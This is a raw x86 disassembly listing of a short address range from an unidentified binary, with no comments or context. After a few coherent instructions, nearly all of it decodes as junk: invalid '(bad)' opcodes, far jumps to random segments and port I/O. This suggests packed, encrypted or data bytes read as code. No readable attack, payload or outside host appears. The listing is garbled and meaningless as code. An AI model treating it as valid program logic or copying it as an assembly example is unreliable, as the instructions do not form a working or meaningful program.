  41a8f1:	mov    DWORD PTR [ebp-0x10],eax
  41a8f4:	mov    eax,DWORD PTR [ebp-0x1c]
  41a8f7:	test   eax,eax
  41a8f9:	je     0x41bfdb
  41a8ff:	mov    DWORD PTR [ebp-0x24],esi
  41a902:	push   0xb
  41a904:	jmp    0x41ab39
  41a909:	rcl    dh,1
  41a90b:	xlat   BYTE PTR ds:[ebx]
  41a90c:	int3   
  41a90d:	aad    0xd1
  41a90f:	fcmovnu st,st(2)
  41a911:	ss (bad) 
  41a913:	inc    esp
  41a914:	sbb    ecx,0xffffff97
  41a917:	lock std 
  41a919:	dec    eax
  41a91a:	aad    0x7f
  41a91c:	js     0x41a92e
  41a91e:	jle    0x41a998
  41a920:	js     0x41a905
  41a922:	mov    bl,0x57
  41a924:	adc    al,0x6e
  41a926:	es popf 
  41a928:	push   es
  41a929:	xchg   esp,eax
  41a92a:	sti    
  41a92b:	push   es
  41a92c:	data16 scas al,BYTE PTR es:[edi]
  41a92e:	sti    
  41a92f:	dec    esp
  41a930:	xor    ebp,ebp
  41a932:	call   0x259a:0x8755cf63
  41a939:	stos   BYTE PTR es:[edi],al
  41a93a:	in     al,0xed
  41a93c:	jp     0x41a931
  41a93e:	call   FWORD PTR [edx-0xd]
  41a941:	inc    ebp
  41a942:	and    dl,BYTE PTR [ebx]
  41a944:	pop    edx
  41a945:	inc    ecx
  41a946:	xchg   esi,eax
  41a947:	add    edx,DWORD PTR [ebx]
  41a949:	shr    BYTE PTR [edx],1
  41a94b:	jnp    0x41a9a9
  41a94d:	inc    edx
  41a94e:	fdivrp st(7),st
  41a950:	push   eax
  41a951:	xchg   ebp,eax
  41a952:	push   edi
  41a953:	aas    
  41a954:	stc    
  41a955:	jmp    0xd85:0x72ec09d9
  41a95c:	loopne 0x41a963
  41a95e:	jmp    0x41a9a3
  41a960:	rcr    BYTE PTR [eax-0x21],0xd5
  41a964:	mov    edx,0x4a079574
  41a969:	cmp    ah,BYTE PTR [ebp-0x1d]
  41a96c:	mov    DWORD PTR [edi+eiz*2-0x7e85c57f],esi
  41a973:	dec    edx
  41a974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a975:	in     al,dx
  41a976:	or     al,0x58
  41a978:	cmc    
  41a979:	adc    eax,0xf6f43264
  41a97e:	push   ebx
  41a97f:	sub    DWORD PTR [esi],esp
  41a981:	iret   
  41a982:	pop    ebp
  41a983:	test   eax,0x79809e10
  41a988:	pop    esi
  41a989:	pop    eax
  41a98a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a98b:	ret    
  41a98c:	push   ecx
  41a98d:	adc    BYTE PTR [ecx],0xe6
  41a990:	test   eax,0xf7e1070e
  41a995:	das    
  41a996:	xchg   ebp,eax
  41a997:	aam    0x4a
  41a999:	jb     0x41a962
  41a99b:	test   BYTE PTR [edi+0x1a],cl
  41a99e:	test   eax,0xea4282e6
  41a9a3:	(bad)  
  41a9a4:	mov    al,ds:0xf70d5fff
  41a9a9:	pop    ebx
  41a9aa:	sbb    al,BYTE PTR cs:[esi-0x665295cf]
  41a9b1:	pop    edx
  41a9b2:	sub    BYTE PTR [esi],bl
  41a9b4:	shl    BYTE PTR [bx],cl
  41a9b7:	inc    ebx
  41a9b8:	jb     0x41a965
  41a9ba:	inc    edi
  41a9bb:	xor    eax,0x244e06f4
  41a9c0:	adc    DWORD PTR [ecx+0x26a39dec],esi
  41a9c6:	(bad)  
  41a9c7:	dec    ebx
  41a9c8:	jns    0x41aa29
  41a9ca:	push   cs
  41a9cb:	mov    ch,0x4
  41a9cd:	jmp    ebx
  41a9cf:	imul   esi,DWORD PTR [edx+0x5a942625],0x7ddec4db
  41a9d9:	mov    eax,ds:0x2951ae34
  41a9de:	in     al,dx
  41a9df:	mov    dl,BYTE PTR [ecx-0x25dbe030]
  41a9e5:	inc    esp
  41a9e6:	retf   0xc758
  41a9e9:	pop    esp
  41a9ea:	sahf   
  41a9eb:	es (bad) 
  41a9ee:	push   0x6e0dc351
  41a9f3:	xchg   edx,eax
  41a9f4:	xlat   BYTE PTR ds:[ebx]
  41a9f5:	mov    ecx,0xe95716cb
  41a9fa:	add    edi,ebx
  41a9fc:	je     0x41a980
  41a9fe:	sbb    dh,BYTE PTR [edi-0x5d02123f]
  41aa04:	(bad)  
  41aa06:	sub    ecx,edi
  41aa08:	sar    bl,cl
  41aa0a:	stos   BYTE PTR es:[edi],al
  41aa0b:	lock aam 0xcf
  41aa0e:	mov    ebx,0x5ec0aaa2
  41aa13:	sub    eax,0xb6200828
  41aa18:	dec    esi
  41aa19:	xor    al,0xff
  41aa1b:	js     0x41aa3e
  41aa1d:	ins    DWORD PTR es:[edi],dx
  41aa1e:	ins    BYTE PTR es:[edi],dx
  41aa1f:	mov    ebx,0xfef74505
  41aa24:	cwde   
  41aa25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa26:	push   esp
  41aa27:	mov    eax,ds:0x45d326c2
  41aa2c:	push   ecx
  41aa2d:	dec    edi
  41aa2e:	adc    al,0x82
  41aa30:	mov    al,0x8d
  41aa32:	stc    
  41aa33:	retf   0xaef5
  41aa36:	(bad)  
  41aa37:	out    dx,al
  41aa38:	xlat   BYTE PTR ds:[ebx]
  41aa39:	mov    dh,0xb0
  41aa3b:	int3   
  41aa3c:	jne    0x41aa1b
  41aa3e:	sti    
  41aa3f:	fs mov ah,0x7d
  41aa42:	xchg   edi,eax
  41aa43:	push   cs
  41aa44:	gs jbe 0x41aa44
  41aa47:	jbe    0x41aa8a
  41aa49:	jno    0x41aa96
  41aa4b:	pop    edi
  41aa4c:	mov    eax,DWORD PTR [ebx+0x2263d568]
  41aa52:	pop    ebp
  41aa53:	call   0xf937:0xf2729c7a
  41aa5a:	dec    esp
  41aa5b:	ret    
  41aa5c:	jbe    0x41aa0d
  41aa5e:	xor    DWORD PTR [edi],edi
  41aa60:	rol    BYTE PTR [ebx+0x71cb8ba7],0x2
  41aa67:	xchg   esi,edi
  41aa69:	push   edi
  41aa6a:	sbb    al,0xee
  41aa6c:	jge    0x41aad4
  41aa6e:	and    BYTE PTR [edi-0x30bc99a3],ch
  41aa74:	xchg   esp,eax
  41aa75:	xlat   BYTE PTR ds:[ebx]
  41aa76:	pushf  
  41aa77:	adc    eax,0x1834d6ff
  41aa7c:	push   ss
  41aa7d:	jl     0x41aa70
  41aa7f:	dec    edx
  41aa80:	xchg   esi,eax
  41aa81:	enter  0xeb2e,0xc5
  41aa85:	daa    
  41aa86:	js     0x41aa72
  41aa88:	in     al,0x17
  41aa8a:	mov    al,BYTE PTR [edx-0x49]
  41aa8d:	mov    ebx,0xa24d58df
  41aa92:	inc    ebx
  41aa93:	xchg   BYTE PTR [edx+0xc8b5844],bh
  41aa99:	sbb    ebp,DWORD PTR [ecx+0x635c4f18]
  41aa9f:	jnp    0x41aaa5
  41aaa1:	cwde   
  41aaa2:	sub    ebp,DWORD PTR [edi+0x250b8fc6]
  41aaa8:	mov    ebp,0x6ba55627
  41aaad:	adc    dl,al
  41aaaf:	mov    bl,0x3c
  41aab1:	pop    eax
  41aab2:	cmp    edi,eax
  41aab4:	dec    esi
  41aab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aab6:	or     eax,DWORD PTR [edi+0x5180790c]
  41aabc:	ret    0xa1f4
  41aabf:	(bad)  
  41aac0:	push   0xffffff9e
  41aac2:	sbb    al,0xd1
  41aac4:	test   DWORD PTR [esi],edx
  41aac6:	add    ebx,DWORD PTR [esi+0x3d]
  41aac9:	pop    ds
  41aaca:	or     eax,0xa1133ef2
  41aacf:	adc    dh,BYTE PTR [ecx]
  41aad1:	bound  esp,QWORD PTR [ebx+0x47719668]
  41aad7:	adc    esi,ecx
  41aad9:	std    
  41aada:	lea    esp,[ebx+0x7d3b1b82]
  41aae0:	jns    0x41aab0
  41aae2:	cmp    eax,0xb7151dc3
  41aae7:	mov    ecx,0xbb6aefeb
  41aaec:	add    al,0x90
  41aaee:	(bad)  [edi]
  41aaf0:	call   0xf299fd6b
  41aaf5:	jb     0x41aaeb
  41aaf7:	lea    edx,[edx+0xd3cf572]
  41aafd:	xlat   BYTE PTR ds:[ebx]
  41aafe:	sbb    eax,0xafb5f468
  41ab03:	push   esp
  41ab04:	mov    ch,0x21
  41ab06:	adc    BYTE PTR [ebp-0x279cbf81],al
  41ab0c:	cdq    
  41ab0d:	push   edx
  41ab0e:	stc    
  41ab0f:	cld    
  41ab10:	xor    eax,0xfe434a11
  41ab15:	test   BYTE PTR [eax+0x66],ah
  41ab18:	add    al,0xec
  41ab1a:	xchg   esp,eax
  41ab1b:	pop    ds
  41ab1c:	sbb    BYTE PTR [esi],dl
  41ab1e:	jmp    0x41ab3a
  41ab20:	mov    BYTE PTR [eax-0x45d408db],dl
  41ab26:	xor    dl,bh
  41ab28:	les    eax,FWORD PTR [edx]
  41ab2a:	inc    ebp
  41ab2b:	les    edi,FWORD PTR [ebp+0x7b]
  41ab2e:	cs mov ah,0x7f
  41ab31:	and    DWORD PTR [edi-0x47],0x64
  41ab35:	and    al,0x73
  41ab37:	inc    esp
  41ab38:	add    ebx,DWORD PTR [ecx+0x6a]
  41ab3b:	add    eax,0x30e95b49
  41ab40:	add    al,BYTE PTR [eax]
  41ab42:	add    dl,dl
  41ab44:	sar    DWORD PTR [edi],cl
  41ab46:	leave  
  41ab47:	cmp    eax,0x48dbdad9
  41ab4c:	pushf  
  41ab4d:	mov    eax,ds:0x24995be
  41ab52:	dec    edx
  41ab53:	pusha  
  41ab54:	fstp   TBYTE PTR [edi+0x78]
  41ab57:	adc    BYTE PTR [esi+0x78],bh
  41ab5a:	js     0x41ab95
  41ab5c:	daa    
  41ab5d:	pop    eax
  41ab5e:	std    
  41ab5f:	stos   DWORD PTR es:[edi],eax
  41ab60:	dec    ecx
  41ab61:	into   
  41ab62:	mov    bl,0xc3
  41ab64:	arpl   WORD PTR [ebp+0x48],bp
  41ab67:	adc    bl,BYTE PTR [edi]
  41ab69:	sbb    esi,DWORD PTR ds:0xaa8e61cb
  41ab6f:	stos   DWORD PTR es:[edi],eax
  41ab70:	inc    edi
  41ab71:	adc    eax,0x5fa48c5f
  41ab76:	xchg   edx,eax
  41ab77:	push   ebp
  41ab78:	imul   BYTE PTR [esi+0x73]
  41ab7b:	and    ebx,esp
  41ab7d:	popf   
  41ab7e:	mov    al,ds:0x87e4b310
  41ab83:	cmp    DWORD PTR [ebx+eiz*1-0x59],ecx
  41ab87:	lahf   
  41ab88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab89:	push   ss
  41ab8a:	iret   
  41ab8b:	fidivr DWORD PTR [esi+ecx*2-0x52]
  41ab8f:	pop    ss
  41ab90:	push   ecx
  41ab91:	arpl   WORD PTR [edx],ax
  41ab93:	lahf   
  41ab94:	mov    dl,BYTE PTR [edi-0x2]
  41ab97:	es lahf 
  41ab99:	jmp    0x9bec:0xe38fc8b
  41aba0:	jns    0x41ab56
  41aba2:	cmp    ebp,esi
  41aba4:	mov    eax,esi
  41aba6:	pop    ecx
  41aba7:	addr16 in eax,0x68
  41abaa:	popa   
  41abab:	rcr    BYTE PTR [ebp-0x695785ea],cl
  41abb1:	xchg   ecx,eax
  41abb2:	sub    eax,0xe8f6ff43
  41abb7:	popf   
  41abb8:	test   BYTE PTR [esi-0xbb4105e],bh
  41abbe:	sub    eax,0xabc04ac2
  41abc3:	lods   al,BYTE PTR ds:[esi]
  41abc4:	sbb    ebx,esp
  41abc6:	stos   BYTE PTR es:[edi],al
  41abc7:	sbb    BYTE PTR [esi+0x275612bc],dh
  41abcd:	das    
  41abce:	jnp    0x41abf4
  41abd0:	in     eax,0x48
  41abd2:	jno    0x41ab65
  41abd4:	xor    eax,0x288e9c6d
  41abd9:	sbb    DWORD PTR [ebx-0x6],esi
  41abdc:	std    
  41abdd:	scas   eax,DWORD PTR es:[edi]
  41abde:	or     DWORD PTR [edx-0x4f],ebx
  41abe1:	in     al,dx
  41abe2:	and    bh,ah
  41abe4:	and    DWORD PTR [edi],esp
  41abe6:	inc    esi
  41abe7:	cmp    bh,dh
  41abe9:	xchg   esp,eax
  41abea:	adc    BYTE PTR [ebp-0x3afed65d],cl
  41abf0:	xor    ebx,DWORD PTR [ebp+0x1d4c1142]
  41abf6:	adc    DWORD PTR [edx-0x6d],eax
  41abf9:	dec    ebx
  41abfa:	popa   
  41abfb:	pusha  
  41abfc:	pop    edx
  41abfd:	and    eax,0x4b35fa8d
  41ac02:	test   al,0x8a
  41ac04:	jo     0x41abec
  41ac06:	mov    dl,0xa2
  41ac08:	daa    
  41ac09:	mov    eax,0x482bf75d
  41ac0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac0f:	fbstp  TBYTE PTR ds:0xfc094bcf
  41ac15:	call   DWORD PTR [ecx+ebp*2]
  41ac18:	out    dx,al
  41ac19:	fldcw  WORD PTR ds:0x5c91463e
  41ac1f:	adc    eax,0x9437e9de
  41ac24:	sub    ebp,eax
  41ac26:	inc    ebx
  41ac27:	pop    esi
  41ac28:	xor    bl,ch
  41ac2a:	dec    ebp
  41ac2b:	adc    edx,ebx
  41ac2d:	ja     0x41ac77
  41ac2f:	cmp    BYTE PTR [ebx],bh
  41ac31:	into   
  41ac32:	sub    cl,dh
  41ac34:	xchg   DWORD PTR [edx-0x210d459a],edx
  41ac3a:	jne    0x41ac39
  41ac3c:	or     BYTE PTR [esi+0x0],bh
  41ac3f:	cmc    
  41ac40:	fldcw  WORD PTR [ebp-0x35]
  41ac43:	sbb    eax,0x87e94041
  41ac48:	sub    ah,dl
  41ac4a:	mov    edi,0xfa4962cf
  41ac4f:	lea    esi,[esi-0x17]
  41ac52:	mov    eax,0x1f2ef4b6
  41ac57:	paddusb mm2,QWORD PTR [edx+esi*4]
  41ac5b:	in     al,dx
  41ac5c:	ret    
  41ac5d:	pop    edx
  41ac5e:	cs sbb ah,cl
  41ac61:	inc    eax
  41ac62:	inc    esi
  41ac63:	daa    
  41ac64:	jmp    0xc1854ef
  41ac69:	shl    DWORD PTR [ebp-0x43],0x95
  41ac6d:	js     0x41ac46
  41ac6f:	xchg   ebx,eax
  41ac70:	lods   eax,DWORD PTR ds:[esi]
  41ac71:	jno    0x41aca0
  41ac73:	mov    bl,0x33
  41ac75:	jnp    0x41ac8a
  41ac77:	add    ebp,DWORD PTR [edx-0x15]
  41ac7a:	push   0x64
  41ac7c:	data16 add ah,BYTE PTR [esi-0x9]
  41ac80:	sub    DWORD PTR [ecx+0x70be5dca],ebp
  41ac86:	inc    edi
  41ac87:	sbb    al,0xfa
  41ac89:	nop
  41ac8a:	mov    BYTE PTR [ebx+0x34],dl
  41ac8d:	enter  0xfe88,0x54
  41ac91:	loopne 0x41acd5
  41ac93:	pop    eax
  41ac94:	mov    al,0xc
  41ac96:	pop    eax
  41ac97:	or     DWORD PTR [ecx],ebp
  41ac99:	(bad)  
  41ac9a:	retf   
  41ac9b:	jmp    0x77640c9c
  41aca0:	pop    edi
  41aca1:	ja     0x41ad0c
  41aca3:	mov    eax,?
  41aca5:	xchg   ecx,eax
  41aca6:	xor    dh,BYTE PTR [esi+0x4cd9459e]
  41acac:	dec    esi
  41acad:	jge    0x41acb9
  41acaf:	test   al,0xc0
  41acb1:	aas    
  41acb2:	sti    
  41acb3:	imul   edi,DWORD PTR [edx-0x3ee4dea8],0x1dd9e732
  41acbd:	sub    edx,DWORD PTR [esi-0x32]
  41acc0:	int3   
  41acc1:	mov    ebp,fs
  41acc3:	adc    BYTE PTR [eax-0x77],ch
  41acc6:	ja     0x41ac93
  41acc8:	or     ebx,DWORD PTR [eax+0x5caa511]
  41acce:	sbb    bl,BYTE PTR [esi+0x64]
  41acd1:	jl     0x41ad3a
  41acd3:	push   ecx
  41acd4:	cdq    
  41acd5:	xor    al,0x43
  41acd7:	pop    esi
  41acd8:	or     dh,BYTE PTR [esi-0x386297b]
  41acde:	sbb    BYTE PTR [ebx+0x78],ch
  41ace1:	mov    ah,0x33
  41ace3:	sbb    al,0x8c
  41ace5:	repnz inc esp
  41ace7:	jmp    0xdc1e:0x6457838c
  41acee:	jae    0x41ad45
  41acf0:	and    ebx,DWORD PTR [esi]
  41acf2:	mov    ch,0xec
  41acf4:	mov    eax,0x72e745f0
  41acf9:	or     bl,BYTE PTR [edi]
  41acfb:	inc    ebx
  41acfc:	iret   
  41acfd:	clc    
  41acfe:	fcmovbe st,st(2)
  41ad00:	dec    eax
  41ad01:	xor    DWORD PTR [esi+0x27],0x54
  41ad05:	sbb    BYTE PTR [ecx+ebp*8],bl
  41ad08:	sar    BYTE PTR [ebp-0x9],1
  41ad0b:	jnp    0x41ad82
  41ad0d:	jne    0x41acbb
  41ad0f:	adc    DWORD PTR [esi-0x6b2c5df6],edi
  41ad15:	mov    ss,WORD PTR [eax]
  41ad17:	(bad)
  41ad1a:	pop    ebp
  41ad1b:	lock and BYTE PTR [ebp+0x49],bl
  41ad1f:	lahf   
  41ad20:	or     edi,DWORD PTR [ebx]
  41ad22:	iret   
  41ad23:	out    0xa2,eax
  41ad25:	jmp    0xa766ea21
  41ad2a:	mov    eax,0x600e02e8
  41ad2f:	ss sti 
  41ad31:	jo     0x41accf
  41ad33:	push   es
  41ad34:	pushf  
  41ad35:	xor    al,cl
  41ad37:	and    DWORD PTR [ebx],ebp
  41ad39:	shl    DWORD PTR [ebp+0x2c51dcf5],0x53
  41ad40:	loop   0x41acfd
  41ad42:	mov    bh,BYTE PTR [edi+0x2]
  41ad45:	or     BYTE PTR [ecx-0x65],0xfd
  41ad49:	sti    
  41ad4a:	aas    
  41ad4b:	sbb    al,0xd1
  41ad4d:	stc    
  41ad4e:	sbb    BYTE PTR [ebx],ch
  41ad50:	in     eax,0x90
  41ad52:	dec    esi
  41ad53:	iret   
  41ad54:	adc    al,0x86
  41ad56:	jae    0x41ad8d
  41ad58:	mov    edx,0xe996612e
  41ad5d:	in     eax,0x55
  41ad5f:	mov    dh,0xe2
  41ad61:	sbb    al,0x6b
  41ad63:	push   ss
  41ad64:	sub    dl,dh
  41ad66:	ins    BYTE PTR es:[edi],dx
  41ad67:	xchg   ecx,eax
  41ad68:	ja     0x41ad70
  41ad6a:	pop    esp
  41ad6b:	ds mov al,0xc
  41ad6e:	push   esi
  41ad6f:	xchg   esi,eax
  41ad70:	loopne 0x41ad44
  41ad72:	in     al,0x87
  41ad74:	retf   
  41ad75:	sub    ebx,ecx
  41ad77:	jmp    0x41afac
  41ad7c:	ret    0xd1d7
  41ad7f:	aas    
  41ad80:	fxch   st(1)
  41ad82:	rcr    cl,cl
  41ad84:	mov    ds:0x84d25295,eax
  41ad89:	jmp    0xd8ba3486
  41ad8e:	jg     0x41ae08
  41ad90:	adc    BYTE PTR [esi+0x78],bh
  41ad93:	js     0x41adda
  41ad95:	mov    DWORD PTR [esi],0x6a2cf5a3
  41ad9b:	push   ebp
  41ad9c:	addr16 popf 
  41ad9e:	jmp    0x41ad61
  41ada0:	sub    DWORD PTR [esi],edx
  41ada2:	add    cl,BYTE PTR [ebx-0x7c615945]
  41ada8:	cmp    al,0x67
  41adaa:	mov    eax,ds:0xdc54082a
  41adaf:	clc    
  41adb0:	pop    ss
  41adb1:	jle    0x41ad46
  41adb3:	xchg   ebp,eax
  41adb4:	bound  esp,QWORD PTR [eax+edi*2]
  41adb7:	pop    ebp
  41adb8:	(bad)  
  41adb9:	loop   0x41ae2b
  41adbb:	inc    cl
  41adbd:	xchg   esi,eax
  41adbe:	xchg   esi,eax
  41adbf:	sub    al,BYTE PTR [esi+eiz*8]
  41adc2:	je     0x41adcf
  41adc4:	scas   al,BYTE PTR es:[edi]
  41adc5:	jge    0x41adfb
  41adc7:	loopne 0x41adcb
  41adc9:	dec    edi
  41adca:	ffree  st(3)
  41adcc:	xchg   edx,eax
  41adcd:	pop    eax
  41adce:	jp     0x41ae34
  41add0:	add    cl,BYTE PTR [edi]
  41add2:	push   DWORD PTR [ebx]
  41add4:	sbb    eax,0x93d60003
  41add9:	scas   al,BYTE PTR es:[edi]
  41adda:	dec    ebp
  41addb:	inc    BYTE PTR [edx]
  41addd:	inc    ebx
  41adde:	aas    
  41addf:	pop    eax
  41ade0:	in     eax,dx
  41ade1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ade2:	jb     0x41adb3
  41ade4:	repz cmp eax,0x32573fea
  41adea:	adc    BYTE PTR [ebx],0xbc
  41aded:	mov    dl,0x5b
  41adef:	(bad)  
  41adf0:	push   0xfffffff7
  41adf2:	mov    ebp,0x80449131
  41adf7:	sub    al,0x77
  41adf9:	xchg   esp,edx
  41adfb:	test   eax,0x3526e24c
  41ae00:	pushf  
  41ae01:	mov    esi,0x75d7f42e
  41ae06:	adc    DWORD PTR [ecx],ebp
  41ae08:	nop
  41ae09:	cmp    bl,BYTE PTR [edi-0x38]
  41ae0c:	data16 gs sahf 
  41ae0f:	aaa    
  41ae10:	cwde   
  41ae11:	sbb    bl,BYTE PTR [eax+ecx*2-0x1d]
  41ae15:	lahf   
  41ae16:	jno    0x41ae8f
  41ae18:	int3   
  41ae19:	in     eax,0xcd
  41ae1b:	inc    ebp
  41ae1c:	test   ecx,0x4220844e
  41ae22:	cwde   
  41ae23:	xor    DWORD PTR [ebx+0xd],0x56
  41ae27:	(bad)
  41ae2b:	fs and edi,ecx
  41ae2e:	nop
  41ae2f:	xor    DWORD PTR [edx],esp
  41ae31:	adc    ebx,esp
  41ae33:	adc    DWORD PTR [ebp+0x34],0xffffffeb
  41ae37:	stos   BYTE PTR es:[edi],al
  41ae38:	ret    0x1add
  41ae3b:	shl    BYTE PTR [esp+ebx*2-0x2894c928],1
  41ae42:	and    bh,BYTE PTR ds:0x69076ce7
  41ae48:	sar    DWORD PTR [edi-0x65a6f3b3],cl
  41ae4e:	repnz add dl,BYTE PTR [eax]
  41ae51:	sub    eax,0x65dee762
  41ae56:	retf   
  41ae57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae58:	mov    ebp,0xe1032065
  41ae5d:	aam    0xfc
  41ae5f:	xchg   ebx,eax
  41ae60:	xchg   esp,eax
  41ae61:	push   edi
  41ae62:	add    al,0xc5
  41ae64:	add    cl,BYTE PTR [eax]
  41ae66:	fld    QWORD PTR [ecx+esi*2+0x6c7e7a8a]
  41ae6d:	sbb    bh,BYTE PTR [edi+0x41]
  41ae70:	push   esi
  41ae71:	mov    ds:0x50e778b7,eax
  41ae76:	and    eax,0x7d646d7b
  41ae7b:	shl    ebp,0x14
  41ae7e:	mov    bl,0xc7
  41ae80:	mov    BYTE PTR [eax-0x2f8341c4],bl
  41ae86:	pop    edi
  41ae87:	int    0x49
  41ae89:	dec    eax
  41ae8a:	les    edi,FWORD PTR [esi]
  41ae8c:	jns    0x41ae0f
  41ae8e:	icebp  
  41ae8f:	ja     0x41ae87
  41ae91:	push   ebx
  41ae92:	in     al,dx
  41ae93:	fistp  WORD PTR [esi+0xd]
  41ae96:	popf   
  41ae97:	scas   eax,DWORD PTR es:[edi]
  41ae98:	or     ebp,DWORD PTR [edi-0x1b]
  41ae9b:	sbb    DWORD PTR [edi-0x59],eax
  41ae9e:	rcl    DWORD PTR [edx-0xc],1
  41aea1:	jmp    0x41aebf
  41aea3:	imul   ebx,DWORD PTR [eax-0x7c],0x55c1bece
  41aeaa:	retf   0x7e80
  41aead:	push   ds
  41aeae:	xchg   esi,eax
  41aeaf:	push   ss
  41aeb0:	jne    0x41aebe
  41aeb2:	lock pop esi
  41aeb4:	in     eax,dx
  41aeb5:	data16 clc 
  41aeb7:	cmc    
  41aeb8:	loopne 0x41af28
  41aeba:	jge    0x41af01
  41aebc:	sahf   
  41aebd:	ja     0x41aeaf
  41aebf:	outs   dx,BYTE PTR ds:[esi]
  41aec0:	dec    ebx
  41aec1:	enter  0xe360,0xe9
  41aec5:	jp     0x41aef2
  41aec7:	ss js  0x41ae93
  41aeca:	into   
  41aecb:	push   0x25
  41aecd:	test   al,0xaf
  41aecf:	sbb    al,BYTE PTR [edi+0x4f]
  41aed2:	jnp    0x41aeb7
  41aed4:	sub    al,0xe1
  41aed6:	mov    dh,0x70
  41aed8:	dec    edx
  41aed9:	sbb    eax,0x40bd0b3d
  41aede:	inc    edi
  41aedf:	aaa    
  41aee0:	rol    DWORD PTR [edi],1
  41aee2:	test   ch,0xb0
  41aee5:	or     eax,0x27ea0fa4
  41aeea:	repnz adc DWORD PTR [edi-0x702f387b],esi
  41aef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aef2:	push   es
  41aef3:	test   al,0xf1
  41aef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aef6:	and    eax,0xa5b262c2
  41aefb:	iret   
  41aefc:	lods   al,BYTE PTR ds:[esi]
  41aefd:	repz or al,0xf6
  41af00:	pop    esi
  41af01:	dec    edi
  41af02:	loope  0x41af4c
  41af04:	inc    esp
  41af05:	dec    ecx
  41af06:	add    BYTE PTR [edx+esi*2+0x2ea3037d],ch
  41af0d:	add    eax,0xcb339e1e
  41af12:	mov    eax,0x7ec0ad7a
  41af17:	(bad)
  41af1b:	outs   dx,DWORD PTR ds:[esi]
  41af1c:	xchg   esi,eax
  41af1d:	cmp    ah,cl
  41af1f:	mov    dh,0x85
  41af21:	ror    BYTE PTR [eax+0x53],1
  41af24:	in     eax,dx
  41af25:	cmp    al,0xfa
  41af27:	or     edx,DWORD PTR [ecx+0x299036e]
  41af2d:	sar    DWORD PTR [ebx-0x77],0xf5
  41af31:	int3   
  41af32:	aas    
  41af33:	in     al,dx
  41af34:	stc    
  41af35:	fbstp  TBYTE PTR [esi+0x4a]
  41af38:	outs   dx,DWORD PTR ds:[esi]
  41af39:	dec    ecx
  41af3a:	es push cs
  41af3c:	push   ss
  41af3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af3e:	and    esp,DWORD PTR [edx+0x51]
  41af41:	jmp    0xde9848b8
  41af46:	(bad)  
  41af47:	jae    0x41af80
  41af49:	jl     0x41af9a
  41af4b:	neg    DWORD PTR [edi-0x64]
  41af4e:	(bad)  
  41af4f:	push   0x7267ee7a
  41af54:	in     al,0x37
  41af56:	mov    ah,0xf2
  41af58:	and    DWORD PTR [edi],ebx
  41af5a:	mov    dl,BYTE PTR [edi+ebx*4-0x1f]
  41af5e:	dec    eax
  41af5f:	jne    0x41aee5
  41af61:	pusha  
  41af62:	gs (bad) 
  41af65:	or     al,dh
  41af67:	das    
  41af68:	add    dh,BYTE PTR [eax-0x36]
  41af6b:	mov    dl,0x29
  41af6d:	inc    ecx
  41af6e:	jbe    0x41af3b
  41af70:	xchg   DWORD PTR [edi],eax
  41af72:	aaa    
  41af73:	mov    eax,0x7b4e4338
  41af78:	std    
  41af79:	dec    esp
  41af7a:	sbb    ah,bh
  41af7c:	pop    edi
  41af7d:	jns    0x41afce
  41af7f:	rcl    DWORD PTR [eax-0x63],0xb5
  41af83:	push   0x81f2c1da
  41af88:	les    edx,FWORD PTR [ecx-0x3faa4034]
  41af8e:	sbb    eax,0x83b78e1b
  41af93:	data16 jle 0x41af40
  41af96:	xor    al,0xb8
  41af98:	rcr    BYTE PTR [eax],cl
  41af9a:	loop   0x41afc8
  41af9c:	xchg   DWORD PTR [edi-0x22],ecx
  41af9f:	nop
  41afa0:	outs   dx,BYTE PTR ds:[esi]
  41afa1:	mov    al,ds:0x6fb30b4a
  41afa6:	sub    DWORD PTR [ebx+eiz*2],esp
  41afa9:	daa    
  41afaa:	in     eax,0x20
  41afac:	xchg   ebx,ecx
  41afae:	jmp    0x41b1e3
  41afb3:	(bad)
  41afb6:	int    0xd4
  41afb8:	int    0xd9
  41afba:	fnstcw WORD PTR [edi+0x2a181003]
  41afc0:	pop    ds
  41afc1:	cli    
  41afc2:	xchg   BYTE PTR [eax],dl
  41afc4:	fidivr WORD PTR [edi+0x78]
  41afc7:	adc    BYTE PTR [esi+0x78],bh
  41afca:	js     0x41b018
  41afcc:	pushf  
  41afcd:	mov    esp,0xb9c9d683
  41afd2:	xor    DWORD PTR [eax],ebx
  41afd4:	cmp    DWORD PTR [ebx],0xd24bdf48
  41afda:	xor    bl,bh
  41afdc:	sti    
  41afdd:	inc    esi
  41afde:	dec    cx
  41afe0:	jne    0x41af63
  41afe2:	xchg   edi,eax
  41afe3:	fst    DWORD PTR [edi]
  41afe5:	xor    al,0xbb
  41afe7:	sub    ecx,DWORD PTR [ebp+edx*4+0x7c]
  41afeb:	mov    ds:0x7856391c,al
  41aff0:	bound  edx,QWORD PTR [ebx]
  41aff2:	and    DWORD PTR [edx+eax*8+0x24],eax
  41aff6:	dec    esp
  41aff7:	push   esi
  41aff8:	imul   ebx,DWORD PTR [ecx-0x2f7ce248],0xfffffffd
  41afff:	repnz popf 
  41b001:	call   0x33437b1e
  41b006:	pusha  
  41b007:	in     al,dx
  41b008:	sti    
  41b009:	mov    eax,0xd304f816
  41b00e:	sub    dh,cl
  41b010:	xor    BYTE PTR [esp+ecx*2],bh
  41b013:	lahf   
  41b014:	sbb    ah,dh
  41b016:	adc    BYTE PTR [esi-0x3c],ch
  41b019:	xchg   DWORD PTR [edi],ecx
  41b01b:	add    bl,BYTE PTR [edx-0x169a925a]
  41b021:	fwait
  41b022:	pop    eax
  41b023:	pop    ss
  41b024:	inc    edx
  41b025:	mov    ebp,0xf6b19273
  41b02a:	cmp    cl,dh
  41b02c:	leave  
  41b02d:	mov    ch,0x58
  41b02f:	and    DWORD PTR [edx+0x7d9b362a],0x5
  41b036:	push   esp
  41b037:	aaa    
  41b038:	in     al,0xf8
  41b03a:	test   eax,0x5967ba4a
  41b03f:	xchg   al,cl
  41b041:	jg     0x41b018
